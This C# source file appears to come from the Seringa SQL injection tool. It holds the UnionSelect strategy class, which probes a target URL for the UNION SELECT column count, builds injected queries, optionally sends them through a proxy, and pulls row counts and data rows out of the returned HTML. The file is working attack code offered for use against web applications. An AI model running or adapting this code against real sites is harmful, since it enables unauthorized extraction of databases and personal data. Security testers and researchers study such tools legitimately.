﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Seringa.Engine.Interfaces;
using Seringa.Engine.Implementations.QueryRunners;
using Seringa.Engine.Utils;
using Seringa.Engine.Exceptions;
using Seringa.Engine.Utils.Extensions;
using Seringa.Engine.DataObjects;
using Seringa.Engine.Static;

namespace Seringa.Engine.Implementations.InjectionStrategies
{
    public class UnionSelect : IInjectionStrategy
    {
        #region Constructors
        public UnionSelect()
        {
            QueryRunner = new SimpleQueryRunner();
        }
        #endregion Constructors

        #region Properties

        #region IWebOperation
        public IProxyDetails ProxyDetails { get; set; }
        public IQueryRunner QueryRunner { get; set; }
        public bool UseProxy { get; set; }
        #endregion IWebOperation

        #region IInjectionStrategy

        public int NumberOfResultsPerRequest
        {
            get
            {
                return _nrCols;
            }
            set
            {

            }
        }

        public string Url { get; set; }
        public string DisplayName
        {
            get
            {
                return "Union select method";
            }
        }
        public int MaxCols
        {
            get
            {
                return _maxCols;
            }
            set
            {
                _maxCols = value;
            }
        }

        public string SelectedDb { get; set; }
        public string SelectedTable { get; set; }
        public bool DetailedExceptions { get; set; }
        public string MappingFile { get; set; }


        public ExploitDetails ExploitDetails { get; set; }
        public PayloadDetails PayloadDetails { get; set; }
        #endregion IInjectionStrategy

        #endregion Properties

        #region Private
        #region Fields
        int _maxCols = 20;
        int _nrCols = 0;
        #endregion Fields
        #endregion Private

        #region Methods

        #region IInjectionStrategy

        public bool TestIfVulnerable()
        {
            bool result = false;

            StringBuilder sbCurExploit = new StringBuilder();
            string query = string.Empty;
            string pageHtml = string.Empty;

            for (int i = 0; i < _maxCols; i++)
            {
                for(int j=0;j<i;j++)
                {
                    sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectValue,j);
                    if(j < i - 1)
                        sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectValue,",");
                }

                query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, string.Format(PayloadDetails.Payload, sbCurExploit.ToString()));
                pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
                if (pageHtml.Contains(GeneralPayloads.UnionBasedErrorMessage))
                    continue;
                else
                {
                    _nrCols = i;
                    result = true;
                    break;
                }
            }

            return result;
        }

        public int GetTotalNoOfCustomQueryResultRows()
        {
            if (_nrCols == 0)
                if (!TestIfVulnerable())
                    throw new SqlInjException("Given script is not injectable using current injection strategy");

            int count = 0;
            string generatedpayload = string.Empty;

            if(PayloadDetails == null)
                return 0;

            if(string.IsNullOrEmpty(PayloadDetails.Payload))
                return 0;

            if(PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Single)
                return 1;

            generatedpayload = PayloadDetails.Payload;

            if (PayloadDetails.Params.Count() > 0)
                foreach(var param in PayloadDetails.Params)
                    generatedpayload = generatedpayload.Replace("{" + param.Position + "}", PayloadHelpers.GetData(param.Name, this));

            generatedpayload = string.Format(GeneralPayloads.QueryResultCount,generatedpayload);

            StringBuilder sbCurExploit = new StringBuilder();

            sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectValue, generatedpayload);
            if(_nrCols > 1)
                sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectValue, ",");

            for (int j = 1; j < _nrCols; j++)
            {
                sbCurExploit.AppendFormat(j.ToString());
                if (j < _nrCols - 1)
                    sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectValue, ",");
            }

            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, string.Format(PayloadDetails.Payload, sbCurExploit.ToString()));
            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);

            var result = HtmlHelpers.GetAnswerFromHtml(pageHtml, query, ExploitDetails, DetailedExceptions);

            int.TryParse(result, out count);
            return count;
        }
        public string GetSingleCustomQueryResultRow(int startingFrom)
        {
            string results = string.Empty;
            StringBuilder sbResult = new StringBuilder();

            string generatedPayload = PayloadDetails.Payload;

            if (PayloadDetails.Params.Count() > 0)
                foreach (var param in PayloadDetails.Params)
                    generatedPayload = generatedPayload.Replace("{" + param.Position + "}", PayloadHelpers.GetData(param.Name, this));

            if (PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Multiple)
                generatedPayload = string.Format(PayloadHelpers.GetSingleResultLimiter(PayloadDetails.Dbms), generatedPayload, startingFrom);

            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, generatedPayload);
            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
            IList<string> resultsBatch = HtmlHelpers.GetMultipleAnswersFromHtml(pageHtml, query, ExploitDetails, DetailedExceptions);

            foreach (string singleResult in resultsBatch)
            {
                if (!string.IsNullOrEmpty(MappingFile))
                    XmlHelpers.SaveToMappingFile(MappingFile, PayloadDetails, singleResult, this);
                sbResult.Append(singleResult);
            }
            return sbResult.ToString(); 
        }

        #endregion IInjectionStrategy

        #endregion Methods
    }
}